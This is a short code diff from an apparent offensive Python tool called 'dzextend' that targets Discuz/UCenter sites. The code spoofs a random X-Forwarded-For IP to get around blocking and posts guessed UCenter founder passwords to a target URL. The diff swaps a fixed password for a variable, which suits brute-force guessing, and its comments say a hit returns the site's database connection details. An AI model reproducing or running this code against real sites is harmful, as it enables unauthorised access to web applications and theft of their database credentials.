@@ -19,7 +19,7 @@ class dzextend:
         ip=str(random.randint(1,255))+"."+str(random.randint(1,255))+"."+str(random.randint(1,255))+"."+str(random.randint(1,255))
         headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0","X-Forwarded-For":ip,'Content-Type':'application/x-www-form-urlencoded','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Connection':'keep-alive'}
 
-        data=requests.post(url,data={'ucfounderpw':'123123'},headers=headers)
+        data=requests.post(url,data={'ucfounderpw':password},headers=headers)
         #fail return -1 
         #success return database connect info
         return data.content
